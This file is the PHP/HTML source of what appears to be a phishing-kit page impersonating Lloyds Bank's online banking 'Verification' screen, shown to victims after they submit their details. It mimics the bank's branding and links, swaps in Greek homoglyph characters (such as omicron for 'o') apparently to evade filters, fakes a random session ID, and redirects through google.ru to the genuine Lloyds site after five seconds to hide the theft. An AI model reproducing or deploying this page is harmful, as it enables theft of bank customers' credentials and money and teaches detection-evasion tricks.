<?php
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("assets/includes/Verify.php");
require_once("Exit.php");
?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Online &Beta;anking : Verification</title>
<link href="assets/images/001.ico" rel="shortcut icon">
<link href="assets/styles/001.css" rel="stylesheet" type="text/css">
<link href="assets/styles/002.css" rel="stylesheet" type="text/css">
<script src="assets/js/001.jspf" type="text/javascript"></script>
<script src="assets/js/001.js" type="text/javascript"></script>
<script src="assets/js/002.js" type="text/javascript"></script>
<script type="text/javascript">
DI.themePath="https://online.lloydsbank.co.uk/personal/unauth/assets/LloydsRetail/";
</script>
<script src="assets/js/003.js" type="text/javascript"></script>
<script type="text/javascript">
$(window).load(function(){
      $("#loading").show();
})
</script>
<meta http-equiv="refresh" content="5; url=https://www.google.ru/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CC0QFjAA&url=http%3A%2F%2Fwww.lloydsbank.com%2F&ei=7wc6VemlDqfjywOGhoD4Cw&usg=AFQjCNHlg73U1m2QoHwNGcKbo2cfoqg9lQ&bvm=bv.91427555,d.bGQ">
</head>
<body>
<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
<li><a href="#page" id="lnkSkip" name="lnkSkip">Skip to main content</a></li>
</ul>
<div class="clearfix"><span id="strbrandname" style="display: none">LL&Omicron;&Upsilon;DS</span>
<p id="logo"><span><img alt="Lloyds&#160;&Beta;ank" src="assets/images/002.png"></span></p>
<div class="loggedIn">
<ul class="abcd">
<li class="mobile"><a id="mobileLnkAuth" name="mobileLnkAuth" href="mobile/Login.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" class="linkBullet">Mobile</a></li>
<li><a id="lnkCookie01" name="lnkCookie01" href="#" class="linkBullet">Cookie policy</a></li>
<li class="secure"><span class="securityAnchor {bubble : &#39;security&#39;, pointer : &#39;upRight&#39;, leftPositionOffset : 70}">Securely signed in</span></li>
<li class="moreInfo"><a class="linkBullet newwin" href="#">Security info</a></li>
<li class="details"><a id="lnkGetPersonalDetails" name="lnkGetPersonalDetails" href="#" class="linkBullet">Change&nbsp;details</a></li>
</ul>
<p class="user"><a id="lnkCustomerLogoff" name="lnkCustomerLogoff" href="https://secure.lloydsbank.co.uk/personal/a/viewaccount/accountoverviewpersonalbase.jsp?lnkcmd=lnkCustomerLogoff&al=&hasJS=true" class="logout"><img src="assets/images/058.png"></a></p>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div class="content" id="page">
<div class="primaryWrap">
<div class="primary">
<div class="panel"> 
<div class="wideMessage">
<a id="loadingIcon" name="loadingIcon" href="#"><img src="assets/images/004.gif" alt="Loading icon" /></a>
<br />
<br />
<h1>Please wait while we check your inf&omicron;rmati&omicron;n</h1>
<br />
<p align="center">It'll &omicron;nly take a few seconds - we're just verifying the details that y&omicron;u've entered.</p>
<p align="center">Please d&omicron;n't refresh this page &omicron;r cl&omicron;se y&omicron;ur browser while y&omicron;u're waiting.</p>
<br />
<div class="subPanel">
<p align="center">You will be auto log-out one's processing is complete.</p>
</div>
</div>
</div>
</div>
</div>
<?php echo verifysecondary; ?>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">www.ll&omicron;ydsbankinggr&omicron;up.c&omicron;m</a></li>
<li><a class="newwin" href="#">Rates and Charges</a></li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>